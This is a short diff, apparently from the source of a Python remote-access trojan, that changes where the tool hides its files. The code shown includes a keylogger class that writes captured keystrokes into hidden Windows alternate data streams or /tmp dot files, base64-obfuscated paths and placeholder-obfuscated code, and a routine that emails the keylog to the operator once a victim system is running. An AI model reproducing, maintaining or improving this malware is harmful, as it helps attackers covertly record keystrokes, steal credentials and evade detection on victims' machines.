@@ -331,7 +331,7 @@ def stitch_running():
     if {9}.endswith('.py') or {9}.endswith('.pyc'):
         {9} = 'python.exe'
     if win_client():
-        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
+        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wXHRtcDpzdHNoZWxsLmxvZw==')
     else:
         {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
     if os.path.exists({7}):
@@ -400,7 +400,7 @@ script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n
 '''.format(st_obf[0],st_obf[1],st_obf[2],st_obf[3],st_obf[4],st_obf[5],st_obf[6],
             st_obf[7],st_obf[8],st_obf[9])
 
-# windows st_running = 'C:\\Windows\\Temp:stshell.log'
+# windows st_running = 'C:\\Windows\\Temp\\tmp:stshell.log'
 # posix st_running = '/tmp/.stshell.log'
 # st_obf[3] = send
 # st_obf[4] = arg_list
@@ -555,7 +555,7 @@ class keylogger():
         self.kl_status = False
         self.frz_status = False
         self.active_window = ''
-        self.log_file = 'C:\\Windows\\Temp:stkl.log'
+        self.log_file = 'C:\\Windows\\Temp\\tmp:stkl.log'
 
     def start(self):
         kl_summary = ''
@@ -981,7 +981,7 @@ body = 'This system is now up and running:\\n\\n{{}}'.format(stinfo)
 
 msg.attach(MIMEText(body,'plain'))
 filename = "kl.log"
-win_kf = 'C:\\Windows\\Temp:stkl.log'
+win_kf = 'C:\\Windows\\Temp\\tmp:stkl.log'
 pos_kf = '/tmp/.stkl.log'
 if os.path.exists(win_kf):
     attachment = open(win_kf,"rb")
